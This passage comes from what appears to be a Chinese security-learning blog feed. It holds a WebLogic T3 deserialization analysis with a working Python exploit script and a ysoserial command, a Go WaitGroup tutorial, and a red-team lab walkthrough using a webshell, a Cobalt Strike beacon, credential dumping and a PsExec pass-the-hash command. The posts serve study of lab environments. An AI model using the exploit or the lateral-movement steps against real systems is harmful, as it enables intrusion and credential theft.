src="https://tva1.sinaimg.cn/large/008i3skNly1gswqfzonx4j31300u0jut.jpg" alt=""></p><p>至此如果如下显示就成功了，如果错误看看防火墙端口有没有打开<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqp4mq2mj316s06uaaf.jpg" alt=""></p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>这个我对着源码看还是一知半解，后面再仔细研究一下。这里是大佬的分析：<a href="https://www.cnblogs.com/potatsoSec/p/14378757.html">https://www.cnblogs.com/potatsoSec/p/14378757.html</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开Wireshark，搜索 ac ed 00 05这是反序列化头的标志，具体的可以看这个类java.io.ObjectStreamConstants<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3e8pibc0j30rc0wsmzp.jpg" alt=""><br>然后按照下图右键搜索到的包-》追踪流-〉TCP流<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2j9b3eksj30l00ma0v6.jpg" alt=""></p><p>可以明显的看见头部是T3协议的的包，然后接下来服务器返回helo包，我们将他转换成16进制更加直观的观察<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2is2m9txj30u00u6qax.jpg" alt=""><br>第一个包发送t3和版本号以及AS、HL等字段，服务器返回HELO包和服务器版本号进行协商<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2ivyqyu2j30u00u6ds5.jpg" alt=""><br>我们观察我们的脚本可以看见中间的那一段便是我们替换掉的cc1的序列化字节，从而造成反序列化攻击。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2jq4lkdvj31ep0u0wuk.jpg" alt=""><br>接下来是我进行远程debug</p><p>我们看补丁的位置：</p><pre><code>wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrevwlthint3client.jar:weblogic.rjvm.MsgAbbrevInputStreamweblogic.jar:weblogic.iiop.Utils</code></pre><p>这里我们就直接走InboundMsgAbbrev中的readObject下断点，看见第一行通过read函数给var2赋值我们跟进<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2h8gczdmj31c00u0n2s.jpg" alt=""><br>跟进以后经过几次跳转会来到这个位置，这个位置是对数据流进行分块处理，往后执行就是将反序列化流依次进行分块，最后依次解析每中的类<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3c4ve8okj30ra0isgmw.jpg" alt=""><br>我们直接在InboundMsgAbbrev#resolveClass()方法下个断点，这个也是打补丁的地方，resolveClass就是将类描述符加工成该类的class对象<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3cqcvaf4j31fu0g20vu.jpg" alt=""></p><p>这里是根据反序列化流解析类的具体流程<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3dhj16zej31c00u0wnf.jpg" alt=""></p><p>java.io.ObjectStreamClass.lookup(Class&lt;?&gt; cl) 方法找到该描述符为可序列化的类。创建一个ObjectStreamClass实例，如果一个尚不存在的类。如果指定的类没有实现java.io.Serializable或java.io.Externalizable，则返回null。</p><p>同时weblogic也存在commoncollection3.2且Java为7u2<br>1的jar包因此可以直接使用cc1进行攻击<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2g1l2yhlj30vo0o2795.jpg" alt=""><br>这里先更换Java环境<br>使用命令生成cc1的序列化文件</p><blockquote><p>java -jar ysoserial.jar CommonsCollections1 “touch /tmp/success.txt” &gt; payload.tmp</p></blockquote><h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><pre><code class="python">#!/usr/bin/pythonimport socketimport structimport syssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_address = (sys.argv[1], int(sys.argv[2]))print &#39;connecting to %s port %s&#39; % server_addresssock.connect(server_address)# Send headersheaders=&#39;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n&#39;print &#39;sending &quot;%s&quot;&#39; % headerssock.sendall(headers)data = sock.recv(1024)print &gt;&gt;sys.stderr, &#39;received &quot;%s&quot;&#39; % datapayloadObj = open(sys.argv[3],&#39;rb&#39;).read()payload=&#39;\x00\x00\x09\xe4\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00&#39;payload=payload+payloadObjpayload=payload+&#39;\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78&#39;print &#39;sending payload...&#39;payload = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(struct.pack(&#39;!i&#39;, len(payload)), payload[4:])#print len(payload)outf = open(&#39;pay.tmp&#39;,&#39;w&#39;)outf.write(payload)outf.close()sock.send(payload)</code></pre><p>最后进行攻击</p><blockquote><p>python exp.py ip 7001 payload.tmp</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2g2mfhz5j316k036jri.jpg" alt=""></p><p>进入docker的命令行后，观察/tmp目录的变化<br>进入docker命令行的命令：</p><blockquote><p>docker exec -it CONTAINER ID  /bin/bash<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2h5095f1j31a406qdhl.jpg" alt=""></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面是我对weblogic早期漏洞的浅显的分析，希望慢慢的经过学习，能够慢慢进步，现在感觉和最开始相比个人觉得收获还是蛮大的。</p>]]></content>
    
    <summary type="html">
    
      Weblogic T3 反序列化学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Golang学习笔记 sync.WaitGroup</title>
    <link href="http://yoursite.com/2021/08/01/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20sync.WaitGroup/"/>
    <id>http://yoursite.com/2021/08/01/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20sync.WaitGroup/</id>
    <published>2021-08-01T07:00:01.000Z</published>
    <updated>2021-11-17T01:35:30.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Golang学习笔记-sync-WaitGroup"><a href="#Golang学习笔记-sync-WaitGroup" class="headerlink" title="Golang学习笔记 sync.WaitGroup"></a>Golang学习笔记 sync.WaitGroup</h1><p>go语言是原生支持并发的语言，在学习并发之前，我们先来学习一下进程、线程以及协程的概念。下面的内容取至《计算机操作系统基础》</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>  我们都知道计算机的核心是CPU，它承担了所有的计算任务；而操作系统是计算机的管理者，它负责任务的调度、资源的分配和管理，统领整个计算机硬件；应用程序则是具有某种功能的程序，程序是运行于操作系统之上的。</p><p>  进程是一个具有一定独立功能的程序在一个数据集上的一次动态执行的过程，是操作系统进行资源分配和调度的一个独立单位，是应用程序运行的载体。进程是一种抽象的概念，从来没有统一的标准定义。</p><p>进程一般由程序、数据集合和进程控制块三部分组成。</p><p>程序用于描述进程要完成的功能，是控制进程执行的指令集；<br>数据集合是程序在执行时所需要的数据和工作区；<br>程序控制块(Program Control Block，简称PCB)，包含进程的描述信息和控制信息，是进程存在的唯一标志。<br>进程具有的特征：</p><p>动态性：进程是程序的一次执行过程，是临时的，有生命期的，是动态产生，动态消亡的；<br>并发性：任何进程都可以同其他进程一起并发执行；<br>独立性：进程是系统进行资源分配和调度的一个独立单位；<br>结构性：进程由程序、数据和进程控制块三部分组成。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>  在早期的操作系统中并没有线程的概念，进程是能拥有资源和独立运行的最小单位，也是程序执行的最小单位。任务调度采用的是时间片轮转的抢占式调度方式，而进程是任务调度的最小单位，每个进程有各自独立的一块内存，使得各个进程之间内存地址相互隔离。</p><p>  后来，随着计算机的发展，对CPU的要求越来越高，进程之间的切换开销较大，已经无法满足越来越复杂的程序的要求了。于是就发明了线程。</p><p>  线程是程序执行中一个单一的顺序控制流程，是程序执行流的最小单元，是处理器调度和分派的基本单位。一个进程可以有一个或多个线程，各个线程之间共享程序的内存空间(也就是所在进程的内存空间)。一个标准的线程由线程ID、当前指令指针(PC)、寄存器和堆栈组成。而进程由内存空间(代码、数据、进程空间、打开的文件)和一个或多个线程组成。</p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程，英文Coroutines，是一种基于线程之上，但又比线程更加轻量级的存在，这种由程序员自己写程序来管理的轻量级线程叫做『用户空间线程』，具有对内核来说不可见的特性。</p><p>因为是自主开辟的异步任务，所以很多人也更喜欢叫它们纤程（Fiber），或者绿色线程（GreenThread）。正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。</p><h2 id="sync-waitGroup"><a href="#sync-waitGroup" class="headerlink" title="sync.waitGroup"></a>sync.waitGroup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>waitGroup有一个内置的计数器，最初从0开始。它具有三个方法Add(),Done(),Wait()。Add()计数器加1，Done()计数器减1，Wait()阻塞代码运行，直到计数器为0.</p><p>直白的说就是一堆小弟在干活，干完活就跑到一个通道里面发送一个空消息，老大在通道等着小弟们的汇报。来一个小弟就记录一个小弟干完了活，直到记录的小弟干完活的数量等于小弟的人数就完成了。</p><p>下面是不使用sync.waitGroup的代码实现：</p><pre><code class="go">works := 3ch := make(chan struct&#123;&#125;)work := func()&#123;    // 搬砖    ch &lt;- struct&#123;&#125; //    通知老大&#125;leader := func() &#123;  cnt := 0  for range ch &#123;    cnt++    if cnt == workers &#123;      break    &#125;  &#125;  close(ch)  // 检查工作成果&#125;go leader()for i := 0; i &lt; workers; i++ &#123;  go worker()&#125;</code></pre><p>那么如果采用sync.waitGroup则</p><pre><code class="go">wg := &amp;sync.WaitGroup&#123;&#125;workers := 3wg.Add(workers)worker := func() &#123;  defer wg.Done()  // 干活&#125;leader := func() &#123;  wg.Wait()  // 检查工作成果&#125;go leader()for i := 0; i &lt; workers; i++ &#123;  go worker()&#125;</code></pre>]]></content>
    
    <summary type="html">
    
      go
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场（一） 练习</title>
    <link href="http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/</id>
    <published>2021-07-24T11:31:01.000Z</published>
    <updated>2021-11-17T01:35:32.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）-练习"><a href="#ATT-amp-CK红队评估实战靶场（一）-练习" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一） 练习"></a>ATT&amp;CK红队评估实战靶场（一） 练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经一个月没有写东西啦，因为期末考试加上自己的项目还有考完还有学校的课程内容一直蛮忙的，一直到16号才放假，上个星期还去安恒实习了，就打算乘着双休搭建一个靶机，想学内网好久了，一直都没有上手操作，这边实际上操作一遍，但是下面的内容还是很蠢的也没有什么值得学习的操作，纯粹是我第一次上手进行内网学习的记录。</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>首先使用nmap进行扫描，使用的命令如下：</p><blockquote><p>nmap -sP 192.168.1.0/24</p></blockquote><p>对192.168.1.0网段进行扫描使用的参数说-sP，使用的是ICMP协议发送echo包来探测的，但是这样不能扫描出禁ping的主机所以要注意一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrxe4ailgj30pm0js0us.jpg" alt=""></p><p>这里可以看见靶机的IP是192.168.1.130，我们继续用nmap扫描一下具体的服务</p><blockquote><p>namp -sV 192.168.1.130</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzqf7tybj30py0k8tcs.jpg" alt=""><br>可以看见开放啦80端口和3306端口先访问看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzxwhlipj615b0u0n5r02.jpg" alt=""><br>使用dirsearch爆破一下，发现了phpmyadmin，随手检测一波弱口令就进去啦（因为是靶机的缘故hh）<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0891arzj30qu09qdhp.jpg" alt=""><br>去看看数据库日志文件的位置，很基础的操作写入shell，没什么好说的。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0d4lcogj31l60qwn1p.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0ipwf22j31ii036mxe.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss12q5wcpj30x40h4q5n.jpg" alt=""><br>通过日志文件写入shell，然后使用蚁剑进行连接。然后进入蚁剑的虚拟终端</p><blockquote><p>whoami #查看当前用户<br>tasklist /svc # 查看当前进程</p></blockquote><p>并去查看是否存在杀软，不存在直接用cs上线。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss1kxh79qj31aa0u0aeq.jpg" alt=""></p><p>在cs生成后门文件直接上传，然后进行执行。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss3yrkyvgj319w0e2t9u.jpg" alt=""><br>进入beacon首先观看一下网卡信息，获得信息如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss43vt7w1j324r0u0ajw.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss4snja48j317u0fmmyx.jpg" alt=""></p><pre><code>win7具有双网卡：      外网：192.168.1.130    内网：192.168.52.143    域：god.org    DNS:192.168.52.138    域内还有两台机器141和138（域控）    只存在一个域GOD</code></pre><p>查看一下域成员<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss5dnjnrzj30nm0euabc.jpg" alt=""></p><p>这里直接使用cs自带的进行提权<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss63afe8ej30u00xpq6x.jpg" alt=""><br>然后直接抓取密码<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss67vdy1aj31vc0s444a.jpg" alt=""><br>这边因为是外网要端口转发到内网端口<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss881yfmhj30su0b2dgm.jpg" alt=""><br>然后进行jump<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8bw24a9j30v60gqdij.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss84tgruhj31kg0ssth6.jpg" alt=""><br>成功获得一个域内主机<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8cbt0i0j324q05m0tw.jpg" alt=""><br>这边成功抓取到了Adminstartor的密码和hash，之后可以通过Psexec进行PTH，但是目标主机是内网不能出网，那么我们需要进行中转上线。</p><p>Psexec原理：</p><ul><li>开启admin$</li><li>445端口共享<br>通过ipc$连接，然后释放psexesvc.exe到目标激情。通过服务管理远程创建psexecsvc服务，并启动。</li></ul><p>缺点：目标系统会有一个配色邪恶吃的服务，在windows日志里可以溯源到IP。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6dknn8ej313c0d6766.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6jijq8nj30u4052t9d.jpg" alt=""><br>然后生成一个木马进行中转上线</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6ine8xdj30l60d83zp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6kf8nrwj30pw0giwgd.jpg" alt=""><br>把生成的beacon.exe上传到目标机器，然后再把psexec一起上传<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss7b46v9nj31pw0ngte4.jpg" alt=""></p><blockquote><p>shell C:\PsExec64.exe -accepteula \192.168.52.138 -u GOD\Administrator -p god.org -d -c C:\beacon.exe</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss90dkwhgj327a0p0aik.jpg" alt=""><br>但是这边我失败了，并没有中转成功，不过我直接用cs的插件成功啦。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss946n8dnj31cg06gwfy.jpg" alt=""><br>成功上线后抓取域内的密码和hash<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss93egn95j32800mi121.jpg" alt=""></p><p>至此结束了，下面是拓扑<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9j10olvj314a0hygoh.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次对靶机的学习其实还有很多知识点没有尝试但是因为第一次上手操作磕磕碰碰的耗费了太久的时间就先到这边结束了。也希望我能撑这个暑假学到足够多的知识，在实习中也能有所提高。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞学习</title>
    <link href="http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-13T11:16:01.000Z</published>
    <updated>2021-07-29T05:50:53.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化漏洞学习"><a href="#Shiro反序列化漏洞学习" class="headerlink" title="Shiro反序列化漏洞学习"></a>Shiro反序列化漏洞学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近临近期末，事情变得很多，到了大二后感觉事情明显变多了，感觉人也很累，已经很久没有更新文章了，记得刚刚开始写博客是大一的时候，刚刚开始写博客也只是瞎搞，慢慢的开始注意到自己不能继续下去，于是就删除了以前的文章。尽管现在的文章质量也还是很低，但是希望自己能够慢慢进步。最近不仅要忙期末考试的事情、还要写项目，开始写项目发现自己的代码功底还是很弱，希望能在大三中改善这点。</p><h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><p>Shiro能到底能做些什么呢？</p><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><p>具体的就自己去了解吧。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里用的是<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo/">p牛的代码</a>,其实刚刚开始打算自己写的，但是弄了好久都一直有一个报错，看了看版本，网上的资料，也没找到原因,报错如下。最后用p牛的代码先学一下，希望以后能够解决这个问题。</p><pre><code>Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [org.apache.commons.collections.keyvalue.TiedMapEntry: static final long serialVersionUID = -8453869361373831205L;]:     at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:55) ~[shiro-core-1.2.4.jar:1.2.4]    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1984) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1848) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2158) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at java.util.HashMap.readObject(HashMap.java:1410) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_281]    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_281]    at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_281]    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2294) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77) ~[shiro-core-1.2.4.jar:1.2.4]    ... 28 common frames omittedCaused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.keyvalue.TiedMapEntry] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.    at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) ~[shiro-core-1.2.4.jar:1.2.4]    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) 